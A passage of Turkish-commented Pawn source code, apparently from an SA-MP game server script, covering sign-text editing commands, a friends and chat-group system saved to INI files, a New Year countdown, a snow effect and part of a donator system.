	return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Bu objeye yazý yazamazsýnýz!");

	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/trenk <0xFF------>");

	format(tRenk[playerid], 24, "%s", params);
	SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Renk kodu iþleme alýndý, yazýyý deðiþtirdikten sonra görüntülenecek.");
	return 1;
}

CMD:iboyut(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	if(lItem[playerid] == 0 && lItem[playerid] == 1 && lItem[playerid] == 2 && lItem[playerid] == 3 && lItem[playerid] == 8
	&& lItem[playerid] == 13 && lItem[playerid] == 14 && lItem[playerid] == 15
	&& lItem[playerid] == 16 && lItem[playerid] == 17 && lItem[playerid] == 18 && lItem[playerid] == 19
	&& lItem[playerid] == 20 && lItem[playerid] == 21 && lItem[playerid] == 22
	&& lItem[playerid] == 25 && lItem[playerid] == 26 && lItem[playerid] == 27)
	return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Bu objeye yazý yazamazsýnýz!");

	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/iboyut <boyut>");

	iBoyut[playerid] = strval(params);
	SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Boyutlandýrma iþleme alýndý, yazýyý deðiþtirdikten sonra görüntülenecek.");
	return 1;
}

stock HexToInt(string[])
{
    if(!string[0]) return 0;
    new cur = 1, res = 0;
    for(new i = strlen(string); i > 0; i--)
    {
        res += cur * (string[i - 1] - ((string[i - 1] < 58) ? (48) : (55)));
        cur = cur * 16;
    }
    return res;
}

CMD:iyazi(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	if(lItem[playerid] == 0 && lItem[playerid] == 1 && lItem[playerid] == 2 && lItem[playerid] == 3 && lItem[playerid] == 8
	&& lItem[playerid] == 13 && lItem[playerid] == 14 && lItem[playerid] == 15
	&& lItem[playerid] == 16 && lItem[playerid] == 17 && lItem[playerid] == 18 && lItem[playerid] == 19
	&& lItem[playerid] == 20 && lItem[playerid] == 21 && lItem[playerid] == 22
	&& lItem[playerid] == 25 && lItem[playerid] == 26 && lItem[playerid] == 27)
	return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Bu objeye yazý yazamazsýnýz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/iyazi <yazi>");
	new var0[256];
	new cs[4] = -255;
	new satir0[128], satir1[128], satir2[128], satir3[128];

	cs[0] = strfind(params, "|", true);
	strmid(satir0, params, 0, cs[0]);
	if(cs[0] == -1){
	    format(var0, sizeof(var0), "%s", params);
	    format(pObjText[playerid], 128, "%s", params);
	}
	else
	{
	cs[1] = strfind(params, "|", true, cs[0]+1);
	strmid(satir1, params, cs[0]+1, cs[1]);
	if(cs[1] == -1){
		strmid(satir1, params, cs[0]+1, strlen(params));
		format(var0, sizeof(var0), "%s\n%s", satir0, satir1);
		format(pObjText[playerid], 128, "%s|%s", satir0, satir1);
	}
	else
	{
	cs[2] = strfind(params, "|", true, cs[1]+1);
	strmid(satir2, params, cs[1]+1, cs[2]);
	if(cs[2] == -1){
		strmid(satir2, params, cs[1]+1, strlen(params));
		format(var0, sizeof(var0), "%s\n%s\n%s", satir0, satir1, satir2);
		format(pObjText[playerid], 128, "%s|%s|%s", satir0, satir1, satir2);
	}
	else
	{
	strmid(satir3, params, cs[2]+1, strlen(params));
	format(var0, sizeof(var0), "%s\n%s\n%s\n%s", satir0, satir1, satir2, satir3);
	format(pObjText[playerid], 128, "%s|%s|%s|%s", satir0, satir1, satir2, satir3);
	}
	}
	}

	if(lItem[playerid] == 4)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 5)
	{
    SetObjectMaterialText(pObj[playerid], var0, 3, OBJECT_MATERIAL_SIZE_512x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 6)
	{
    SetObjectMaterialText(pObj[playerid], var0, 0, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 7)
	{
    SetObjectMaterialText(pObj[playerid], var0, 0, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 9)
	{
    SetObjectMaterialText(pObj[playerid], var0, 1, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 10)
	{
    SetObjectMaterialText(pObj[playerid], var0, 1, OBJECT_MATERIAL_SIZE_512x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 11)
	{
    SetObjectMaterialText(pObj[playerid], var0, 1, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 12)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 22)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 23)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 24)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_128x64,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	if(lItem[playerid] == 28)
	{
    SetObjectMaterialText(pObj[playerid], var0, 2, OBJECT_MATERIAL_SIZE_128x32,
    "Arial", iBoyut[playerid], 0, HexToInt(iRenk[playerid]), HexToInt(tRenk[playerid]), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
	return 1;
}

// ************************************************************************************************************************************************************
// Arkadaþlýk Sistemi [ XpDevil ]
// ************************************************************************************************************************************************************
CMD:g(playerid, params[])
{
	new g_msj[256];
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "Kullaným: /g [mesaj]");
	new g_id = GetPVarInt(playerid, "msj_gID");
	if(g_id == -1) return SendClientMessage(playerid, -1, "Önce bir grup seçin! ('/arkadaslar > Sohbet Gruplarý')");

	format(g_msj, sizeof(g_msj), ">> [GRUP] {FF0000}[%s] {00A1FF}[%s]{FFFFFF}: %s", grupVeri[g_id][g_isim], Isim(playerid), params);
    GrubaSendClientMessage(g_id, g_msj);

	return 1;
}

CMD:arkadaslarbuglu(playerid, params[])
{
    KomutGoster(playerid);
	return 1;
}

CMD:gruplar(playerid, params[])
{
	new str[512];
 	for(new i; i<MAX_GRUP; i++)
	{
		if(strlen(grupVeri[i][g_isim])) format(str, sizeof(str), "%s\n%s", str, grupVeri[i][g_isim]);
	}
	ShowPlayerDialog(playerid, 123, DIALOG_STYLE_MSGBOX, "grups", str, "tamam", "");
	return 1;
}

stock GrupListGoster(playerid)
{
	new g_str[1500];
	format(g_str, sizeof(g_str), "Grup Adý\tÜye Sayýsý\n{B7BBBA}>> Grup Oluþtur");
	for(new g; g<MAX_GRUP; g++)
	{
	    for(new p; p<MAX_GRUP_KATILIMCI; p++)
	    {
	        if(strlen(grupOyn[g][p]) == strlen(Isim(playerid)) && !strcmp(grupOyn[g][p], Isim(playerid)))
			{
			    if(GetPVarInt(playerid, "msj_gID") == g) format(g_str, sizeof(g_str), "%s\n{00A1FF}%s\t{B7BBBA}({00FF00}%d{B7BBBA}/%d)", g_str, grupVeri[g][g_isim], GrupOnlineSayisi(g), GrupUyeSayisi(g));
				else format(g_str, sizeof(g_str), "%s\n{FFA500}%s\t{B7BBBA}({00FF00}%d{B7BBBA}/%d)", g_str, grupVeri[g][g_isim], GrupOnlineSayisi(g), GrupUyeSayisi(g));
			}
	    }
	}
    ShowPlayerDialog(playerid, ARK_DIALOG+5, DIALOG_STYLE_TABLIST_HEADERS, "Gruplar", g_str, "Seç", "<< Geri");
	return 1;
}

stock KomutGoster(playerid)
{
	new baslik[64], liste[55*MAX_ARKADAS], chck[2];
	format(liste, sizeof(liste), "Nick\tOnline Durum\n{B7BBBA}>> Arkadaþ Ekle\n{B7BBBA}>> Sohbet Gruplarý");
	for(new a; a<MAX_ARKADAS; a++)
	{
		if(strlen(arkList[playerid][a]))
		{
			if(IsPlayerConnected(GetPlayerIdFromName(arkList[playerid][a]))) format(liste, sizeof(liste), "%s\n{FFFFFF}%s\t{00FF00}[Online]", liste, arkList[playerid][a]), chck[1]++;
			else format(liste, sizeof(liste), "%s\n{FFFFFF}%s\t{FF0000}[Offline]", liste, arkList[playerid][a]);
			chck[0]++;
		}
	}
	format(baslik, sizeof(baslik), "Arkadaþ Listesi ({00FF00}%d{B7BBBA}/%d)", chck[1], chck[0]);
	ShowPlayerDialog(playerid, ARK_DIALOG, DIALOG_STYLE_TABLIST_HEADERS, baslik, liste, "Seç", "Kapat");
	return 1;
}

stock GrupGoster(playerid, grupisim[])
{
	new g_id = GrupIDVer(grupisim);
	SetPVarInt(playerid, "tmp_gID", g_id);
	if(GetPVarInt(playerid, "tmp_gID") == -1) return SendClientMessage(playerid, -1, "Bu grup bulunamadý!"), GrupListGoster(playerid);
	{
		if(!xStrcmp(grupVeri[g_id][g_kurucu], Isim(playerid)))
		{
			new baslik[64];
			format(baslik, sizeof(baslik), "{FFA500}>> %s {FF0000}[BU GRUBUN KURUCUSUSUNUZ]", grupisim);
			ShowPlayerDialog(playerid, ARK_DIALOG+6, DIALOG_STYLE_LIST, baslik, "{FFA500}Bu Grubu Seç {B7BBBA}(Mesaj için: /g [mesaj])\n{FFA500}Gruptaki Oyuncularý Gör\n{FFA500}Gruba Oyuncu Ekle\n{FFA500}Gruptan Oyuncu Çýkar\n{FFA500}Grubu Sil", "Seç", "<< Geri");
		}
		else
		{
			new baslik[64];
			format(baslik, sizeof(baslik), "{FFA500}>> %s", grupisim);
			ShowPlayerDialog(playerid, ARK_DIALOG+6, DIALOG_STYLE_LIST, baslik, "{FFA500}Bu Grubu Seç {B7BBBA}(Mesaj için: /g [mesaj])\n{FFA500}Gruptaki Oyuncularý Gör\n{FFA500}Gruptan Çýk", "Seç", "<< Geri");
		}
	}
	return 1;
}

stock GrupUyeSayisi(grupid)
{
	new sayi;
	for(new p; p<MAX_GRUP_KATILIMCI; p++) if(strlen(grupOyn[grupid][p])) sayi++;
	return sayi;
}

stock GrupOnlineSayisi(grupid)
{
	new sayi;
	for(new p; p<MAX_GRUP_KATILIMCI; p++) if(IsPlayerConnected(GetPlayerIdFromName(grupOyn[grupid][p]))) sayi++;
	return sayi;
}

stock GrupBosSlotIDVer(grupid)
{
	for(new p; p<MAX_GRUP_KATILIMCI; p++) if(!strlen(grupOyn[grupid][p])) return p;
	return -1;
}

stock BosGrupIDVer()
{
	for(new i; i<MAX_GRUP; i++)
	{
	    if(grupVeri[i][g_Var] == 0) return i;
	}
	return -1;
}

stock GrubaSendClientMessage(grupid, mesaj[])
{
	for(new p; p<MAX_GRUP_KATILIMCI; p++)
	{
		if(IsPlayerConnected(GetPlayerIdFromName(grupOyn[grupid][p])))
		{
			SendClientMessage(GetPlayerIdFromName(grupOyn[grupid][p]), 0xFFA500AA, mesaj);
		}
	}
	return 1;
}

stock GrupCheck(playerid, grupid)
{
	for(new p; p<MAX_GRUP_KATILIMCI; p++)
	{
	    if(!xStrcmp(grupOyn[grupid][p], Isim(playerid))) return 1;
	}
	return 0;
}
stock ArkKayit(playerid)
{
	new ark_dosya[64];
	format(ark_dosya, sizeof(ark_dosya), "xFriendship/_%s.ini", Isim(playerid));

	SINI_Open(ark_dosya);

	new prt[6];
	for(new i; i<MAX_ARKADAS; i++)
	{
	    if(strlen(arkList[playerid][i]))
	    {
		    format(prt, sizeof(prt), "Ark%d", i);
		    SINI_WriteString(prt, arkList[playerid][i]);
	    }
	}
	SINI_Save();
	SINI_Close();
	return 1;
}

stock grupKayit(grupid)
{
	new g_dosya[64];
	format(g_dosya, sizeof(g_dosya), "xFriendship/Gruplar/%d.ini", grupid);

    SINI_Open(g_dosya);

	SINI_WriteString("Kurucu", grupVeri[grupid][g_kurucu]);
	SINI_WriteString("Isim", grupVeri[grupid][g_isim]);
	new pt[10];
	for(new p; p<MAX_GRUP_KATILIMCI; p++)
	{
	    format(pt, sizeof(pt), "Uye%d", p);
	    SINI_RemoveEntry(pt);
	    if(strlen(grupOyn[grupid][p]))
	    {
			SINI_WriteString(pt, grupOyn[grupid][p]);
	    }
	}
	SINI_Save();
	SINI_Close();
	return 1;
}

stock ArkYukle(playerid)
{

	new ark_dosya[64];
	format(ark_dosya, sizeof(ark_dosya), "xFriendship/_%s.ini", Isim(playerid));
	new prt[6];
	SINI_Open(ark_dosya);

	for(new i; i<MAX_ARKADAS; i++)
	{
	    format(arkList[playerid][i], 24, "");
		format(prt, sizeof(prt), "Ark%d", i);
		SINI_ReadString(arkList[playerid][i], prt);
	}
	SINI_Close();
	return 1;
}

stock grupYukle()
{
    new g_dosya[64], gsayi;
	for(new g; g<MAX_GRUP; g++)
	{
		format(g_dosya, sizeof(g_dosya), "xFriendship/Gruplar/%d.ini", g);
		if(SINI_Exist(g_dosya))
		{
		    SINI_Open(g_dosya);
		    grupVeri[g][g_Var] = 1;
		    SINI_ReadString(grupVeri[g][g_kurucu], "Kurucu", 24);
		    SINI_ReadString(grupVeri[g][g_isim], "Isim", 24);
		    gsayi++;
			new pt[10];

			for(new p; p<MAX_GRUP_KATILIMCI; p++)
			{
   				format(pt, sizeof(pt), "Uye%d", p);
   				SINI_ReadString(grupOyn[g][p], pt, 24);
			}
		}
	}
	SINI_Close();
	new p_st[48];
	print("\n\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::");
	format(p_st, sizeof(p_st), "\nxFriendship - %d Grup yuklendi!", gsayi);
	print(p_st);
	return 1;
}

stock Isim(playerid)
{
	new ism[24];
	GetPlayerName(playerid, ism, 24);
	return ism;
}

stock xStrcmp(str1[], str2[])
{
    if(strlen(str1) == strlen(str2) && strcmp(str1, str2) == 0) return 0;
	return 1;
}

stock GetPlayerIdFromName(playername[])
{
  for(new i = 0; i <= MAX_PLAYERS; i++)
  {
    if(IsPlayerConnected(i))
    {
      new playername2[MAX_PLAYER_NAME];
      GetPlayerName(i, playername2, sizeof(playername2));
      if(xStrcmp(playername2, playername) == 0)
      {
        return i;
      }
    }
  }
  return INVALID_PLAYER_ID;
}

stock GrupIDVer(grupisim[])
{
  for(new i = 0; i <= MAX_GRUP; i++)
  {
    if(grupVeri[i][g_Var] == 1)
    {
      if(xStrcmp(grupisim, grupVeri[i][g_isim]) == 0)
      {
        return i;
      }
    }
  }
  return -1;
}

stock IsValidName(string[])
{
  for(new i; i<strlen(string); i++)
  {
    if((string[i] < 32) ||
	(string[i] > 32 && string[i] < 48) ||
	(string[i] > 57 && string[i] < 65) ||
	(string[i] > 90 && string[i]< 97) ||
	(string[i] > 122 &&
	string[i] != 208 &&
	string[i] != 214 &&
	string[i] != 246 &&
	string[i] != 220 &&
	string[i] != 252 &&
	string[i] != 199 &&
	string[i] != 231 &&
	string[i] != 221 &&
	string[i] != 222 &&
	string[i] != 240 &&
	string[i] != 253 &&
	string[i] != 254)) return 0;
  }
  return 1;
}

stock MesajGonder(playerid, msj[], tur) // tür: 0: Uyarý, 1: Bilgi
{
	new mes[128];
	if(tur == 0) format(mes, sizeof(mes), "{FF0000}<!> {FF9500}%s", msj);
	else format(mes, sizeof(mes), "{00FF00}<!> {0BD600}%s", msj);
	return SendClientMessage(playerid, 0xFFFFFF, mes);
}

stock ArkadasSayisi(playerid)
{
	new check=0;
	for(new i; i<MAX_ARKADAS; i++)
	{
	    if(strlen(arkList[playerid][i])) check++;
	}
	return check;
}

stock IsimCheck(playerid, isim[])
{
	for(new i; i<MAX_ARKADAS; i++)
	{
	    if(!strcmp(arkList[playerid][i], isim) && !isnull(arkList[playerid][i])) return 1;
	}
	return 0;
}

stock ArkadasEkle(playerid, eklenecekIsim[])
{
	new msj[128];
	if(ArkadasSayisi(playerid) >= MAX_ARKADAS)
	{
		format(msj, sizeof(msj), "Arkadaþ listeniz dolduðu için %s adlý kiþiyi ekleyemediniz!", eklenecekIsim);
		SendClientMessage(playerid, -1, msj);
		format(msj, sizeof(msj), "%s'in arkadaþ listesi dolduðu için sizi ekleyemedi!", Isim(playerid));
		SendClientMessage(GetPlayerIdFromName(eklenecekIsim), -1, msj);
	}
	if(ArkadasSayisi(GetPlayerIdFromName(eklenecekIsim)) >= MAX_ARKADAS)
	{
		format(msj, sizeof(msj), "Arkadaþ listeniz dolduðu için %s adlý kiþiyi ekleyemediniz!", Isim(playerid));
		SendClientMessage(GetPlayerIdFromName(eklenecekIsim), -1, msj);
		format(msj, sizeof(msj), "%s'in arkadaþ listesi dolduðu için sizi ekleyemedi!", eklenecekIsim);
		SendClientMessage(playerid, -1, msj);
	}

	for(new i; i<MAX_ARKADAS; i++)
	{
	    if(!strlen(arkList[playerid][i]))
	    {
	        if(IsimCheck(playerid, eklenecekIsim) == 1)
	        {
	            format(msj, sizeof(msj), "%s adlý kiþi zaten sizin listenizde var!", eklenecekIsim);
				SendClientMessage(playerid, -1, msj);
				break;
	        }
 	       	format(arkList[playerid][i], 24, "%s", eklenecekIsim);
			format(msj, sizeof(msj), "%s adlý kiþiyi arkadaþ olarak eklediniz!", eklenecekIsim);
			SendClientMessage(playerid, -1, msj);
			break;
	    }
	}
	for(new i; i<MAX_ARKADAS; i++)
	{
	    if(!strlen(arkList[GetPlayerIdFromName(eklenecekIsim)][i]))
	    {
     		if(IsimCheck(GetPlayerIdFromName(eklenecekIsim), Isim(playerid)) == 1)
	        {
				format(msj, sizeof(msj), "%s adlý kiþi zaten sizin listenizde var!", Isim(playerid));
				SendClientMessage(GetPlayerIdFromName(eklenecekIsim), -1, msj);
				break;
	        }
 	       	format(arkList[GetPlayerIdFromName(eklenecekIsim)][i], 24, "%s", Isim(playerid));
			format(msj, sizeof(msj), "%s adlý kiþiyi arkadaþ olarak eklediniz!", Isim(playerid));
			SendClientMessage(GetPlayerIdFromName(eklenecekIsim), -1, msj);
			break;
	    }
	}
	return 1;
}

stock isNumeric(const string[]) { // dutils.inc'den alýnmýþtýr
	new length=strlen(string);
	if (length==0) return false;
	for (new i = 0; i < length; i++) {
		if (
		(string[i] > '9' || string[i] < '0' && string[i]!='-' && string[i]!='+') // Not a number,'+' or '-'
		|| (string[i]=='-' && i!=0)                                             // A '-' but not at first.
		|| (string[i]=='+' && i!=0)                                             // A '+' but not at first.
		) return false;
	}
	if (length==1 && (string[0]=='-' || string[0]=='+')) return false;
	return true;
}
/*
//================================== [ Yeni Duyuru Sistemi ] ===================
function event(yazi[])
{
	switch(EventBase)
	{
	    case 0:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event0[playerid]);

			TextDrawSetString(Event0[playerid], yazi);
        }
	 	KillTimer(eventT_0), eventT_0 = SetTimer("Event0_Deler", 14*1000, false),EventBase++;
		}
	    case 1:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event1[playerid]);
		TextDrawSetString(Event1[playerid], yazi);
        }
	 	KillTimer(eventT_1), eventT_1 = SetTimer("Event1_Deler", 14*1000, false),EventBase++;
		}
	    case 2:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event2[playerid]);
		TextDrawSetString(Event2[playerid], yazi);
		}
	 	KillTimer(eventT_2), eventT_2 = SetTimer("Event2_Deler", 14*1000, false),EventBase++;
		}
	    case 3:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event3[playerid]);

		TextDrawSetString(Event3[playerid], yazi);

		}
	 	KillTimer(eventT_3), eventT_3 = SetTimer("Event3_Deler", 14*1000, false),EventBase++;
		}
	    case 4:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event4[playerid]);
		TextDrawSetString(Event4[playerid], yazi);

		}
	 	KillTimer(eventT_4), eventT_4 = SetTimer("Event4_Deler", 14*1000, false),EventBase++;
		}
	    case 5:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawShowForPlayer(playerid, Event5[playerid]);
		TextDrawSetString(Event5[playerid], yazi);

		}
	 	KillTimer(eventT_5), eventT_5 = SetTimer("Event5_Deler", 14*1000, false),EventBase=0;
		}
	}
    return true;
}

function Event0_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event0[playerid]);
	    TextDrawSetString(Event0[playerid], "");
	}
	return true;
}
function Event1_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event1[playerid]);
	    TextDrawSetString(Event1[playerid], "");
	}
	return true;
}
function Event2_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event2[playerid]);
	    TextDrawSetString(Event2[playerid], "");
	}
	return true;
}
function Event3_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event3[playerid]);
	    TextDrawSetString(Event3[playerid], "");
	}
	return true;
}
function Event4_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event4[playerid]);
	    TextDrawSetString(Event4[playerid], "");
	}
	return true;
}
function Event5_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event5[playerid]);
	    TextDrawSetString(Event5[playerid], "");
	}
	return true;
}*/
//==============================================================================
// ************************************************************************************************************************************************************
// Yýlbaþý Sayacý ( By Hwang )
// ************************************************************************************************************************************************************
forward YilbasiSayaci();
public YilbasiSayaci()
{
    getdate(timeVar[0], timeVar[1], timeVar[2]);
    if(timeVar[1] == 12 && timeVar[2] == 31)
    {
		new
		    string[76], s, d, sa;
		gettime(s, d, sa);

		if(s == 23 && d == 59)
		{
		    if(Colorize_ == false)
		    {
		        #if defined GECE_GUNDUZ
				SetWorldTime(12);
				#endif
		        Colorize_ = true;
				format(string, sizeof string, "~r~~h~%d saniye kaldi!", 60-sa-1);
			} else {
			    #if defined GECE_GUNDUZ
				SetWorldTime(0);
				#endif
		        Colorize_ = false;
				format(string, sizeof string, "~g~~h~~h~%d saniye kaldi!", 60-sa-1);
			}
			GameTextForAll(string, 1000, 5);
			if(60-sa <= 1)
			{
			    #if defined GECE_GUNDUZ
				SetWorldTime(0);
				#endif
			    KillTimer(YilbasiTimer);
				for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
				{
					TextDrawShowForPlayer(i, Yilbasi8);
					TextDrawShowForPlayer(i, Yilbasi9);
					TextDrawShowForPlayer(i, Yilbasi10);
					TextDrawShowForPlayer(i, Yilbasi11);
					TextDrawShowForPlayer(i, Yilbasi12);
					TextDrawShowForPlayer(i, Yilbasi13);
					TextDrawShowForPlayer(i, Yilbasi14);
					TextDrawShowForPlayer(i, Yilbasi15);
					TextDrawShowForPlayer(i, Yilbasi16);
					TextDrawShowForPlayer(i, Yilbasi19);
					RewardPlayer(i, YBMONEY_PRIZE, YBSCORE_PRIZE);
					SendClientMessage(i, 0xf1c40f, "Acýsýyla, tatlýsýyla, iyisiyle kötüsüyle bir yýl daha geçti. Hoþ geldin yeni yýl. Mutlu yýllar dostum!");
					SendClientMessage(i, 0x9b59b6, ""YBSERVER_NAME", mutlu yýllar diler!");
		 		}
		 		SetTimer("OnYilbasiSayaciExit", 10 * 1000, false);
	 		}
		}
 	}
	return true;
}

forward OnYilbasiSayaciExit();
public OnYilbasiSayaciExit()
{
	KillTimer(YilbasiTimer);
	TextDrawHideForAll(Yilbasi8);
	TextDrawHideForAll(Yilbasi9);
	TextDrawHideForAll(Yilbasi10);
	TextDrawHideForAll(Yilbasi11);
	TextDrawHideForAll(Yilbasi12);
	TextDrawHideForAll(Yilbasi13);
	TextDrawHideForAll(Yilbasi14);
	TextDrawHideForAll(Yilbasi15);
	TextDrawHideForAll(Yilbasi16);
	TextDrawHideForAll(Yilbasi19);

	TextDrawDestroy(Yilbasi8);
	TextDrawDestroy(Yilbasi9);
	TextDrawDestroy(Yilbasi10);
	TextDrawDestroy(Yilbasi11);
	TextDrawDestroy(Yilbasi12);
	TextDrawDestroy(Yilbasi13);
	TextDrawDestroy(Yilbasi14);
	TextDrawDestroy(Yilbasi15);
	TextDrawDestroy(Yilbasi16);
	TextDrawDestroy(Yilbasi19);
	return 1;
}

// ************************************************************************************************************************************************************
// Kar Sistemi ( By ForumSA:MPliDayý )
// ************************************************************************************************************************************************************
CB:UpdateSnow(playerid)
{
	if(!snowOn{playerid}) return 0;
	new Float:pPos[3];
	GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	for(new i = 0; i < MAX_SNOW_OBJECTS; i++) SetDynamicObjectPos(snowObject[playerid][i], pPos[0] + random(25), pPos[1] + random(25), pPos[2] - 5 + random(10));
	return 1;
}

stock CreateSnow(playerid)
{
	if(snowOn{playerid}) return 0;
	new Float:pPos[3];
	GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	for(new i = 0; i < MAX_SNOW_OBJECTS; i++) snowObject[playerid][i] = CreateDynamicObject(18864, pPos[0] + random(25), pPos[1] + random (25), pPos[2] - 5 + random(10), random(280), random(280), 0, -1, -1, playerid);
	snowOn{playerid} = true;
	updateTimer{playerid} = SetTimerEx("UpdateSnow", UPDATE_INTERVAL, true, "i", playerid);
	return 1;
}

stock DeleteSnow(playerid)
{
	if(!snowOn{playerid}) return 0;
	for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
	KillTimer(updateTimer{playerid});
	snowOn{playerid} = false;
	return 1;
}

CMD:kar(playerid, params[])
{
	if(snowOn{playerid})
	{
	    DeleteSnow(playerid);
	    SendClientMessage(playerid, 0x00FF00AA, "* Artýk kar görmüyorsunuz.");
	}
	else
	{
	    CreateSnow(playerid);
	    SendClientMessage(playerid, 0x00FF00AA, "* Kendinize kar yaðdýrmaya baþladýnýz!");
	}
	return 1;
}

CMD:karac(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 4 && Root[playerid] == 0) return 0;
    ploop(i) //This is included in my FS! It's the '#define ploop(%0)' thing.
    {
        if(snowOn{i}) continue;
        CreateSnow(i);
    }
    return 1;
}

CMD:karkapat(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 4 && Root[playerid] == 0) return 0;
    ploop(i)
    {
        if(!snowOn{i}) continue;
        DeleteSnow(i);
    }
    return 1;
}

// ************************************************************************************************************************************************************
// Donator Sistemi ( By EvoturK )
// ************************************************************************************************************************************************************
// /donekle
CMD:donekle(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return 0;
	new Mesaj[256];
	if (sscanf(params, "s[256]", Mesaj)) return SendClientMessage(playerid, -1, "Kullaným: /donekle {FFC000}[ Ýsim ]");

	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);
	CreateDon(Mesaj, oX, oY, oZ-0.8);
	BILGI(playerid, "Bulunduðunuz yere Donator eklendi!");
	return 1;
}

// /donsil
CMD:donsil(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return 0;

	new YakinDon = NearDon(playerid);

	if(YakinDon == -1) return Hata(playerid, "Yakýnlarda Donator yok!");

	DeleteDon(YakinDon);
	BILGI(playerid, "Yanýnýzdaki Donator silindi.");
	return 1;
}

// /donatorler
CMD:donatorler(playerid, params[])
{
	SendAdminText(playerid, "/donatorler", params);

	new AdminList[2000];
	foreach(new i:DONs)
	{
  		format(AdminList, 2000, "%s{FFC000}%s\n", AdminList, Don[i][DonName]);
	}

